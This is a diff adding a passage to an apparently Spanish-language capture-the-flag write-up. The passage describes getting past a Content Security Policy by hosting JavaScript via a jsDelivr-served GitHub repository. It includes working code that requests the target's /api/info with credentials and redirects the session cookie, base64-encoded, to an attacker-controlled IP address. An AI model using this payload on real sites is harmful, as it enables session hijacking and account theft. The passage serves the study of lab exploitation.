@@ -232,6 +232,22 @@ Pero tiene configuradas una cabeceras de Content Security Policy (CSP) para evit
 Content-Security-Policy: default-src 'self' 'unsafe-inline';script-src 'self' https://cdn.jsdelivr.net;style-src 'self' https://fonts.googleapis.com;font-src 'self' https://fonts.gstatic.com;img-src 'self';object-src 'none';frame-src 'none';connect-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self';frame-ancestors 'self';script-src-attr 'none'
 ```
 
+Ahora tenemos que probar si podemos robar la cookie, al solo permitir lo que vimos antes tenemos que crear una cuenta de Github, creamos un repositorio publico, y vamos a crear un archivo con JavaScript para hacer una petición por GET a `https://guitjapeo.thl/api/info` y esperamos que el server mande el JSON que lleva la cookie una vez llegue la respuesta nos la pasamos a nuestro servidor encodeada en `base64`.
 
+```Javascript
+var req = new XMLHttpRequest();
+req.onload=reqListener;
+var url="https://guitjapeo.thl/api/info";
+req.withCredentials=true;
+req.open("GET",url,false);
+req.send();
+function reqListener() {
+    var req2=new XMLHttpRequest();
+    const sess=JSON.parse(this.responseText).cookie;
+    location.href="http://192.168.91.191/?data="+btoa(sess);
+};
+```
+
+De momento vamos a montarmos un servidor HTTP con python3
 
 
